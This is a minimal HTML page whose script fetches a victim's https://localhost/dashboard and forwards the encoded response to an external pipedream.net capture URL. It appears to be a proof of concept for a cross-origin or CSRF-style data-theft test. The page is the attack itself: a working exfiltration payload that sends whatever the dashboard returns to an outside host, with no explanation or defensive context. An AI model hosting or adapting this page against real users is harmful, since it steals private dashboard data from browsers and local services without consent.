<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
      const getReq = new XMLHttpRequest();
getReq.open('GET', 'https://localhost/dashboard', true);
getReq.onload = () => {
  if (getReq.status === 200) {
    const data = encodeURIComponent(getReq.responseText); // Encode data for URL
    const sendReq = new XMLHttpRequest();
    sendReq.open('GET', `https://eo152lqegwprrxn.m.pipedream.net/${data}`, true);
    sendReq.send();
  }
};
getReq.send();
    </script>
</body>
</html>
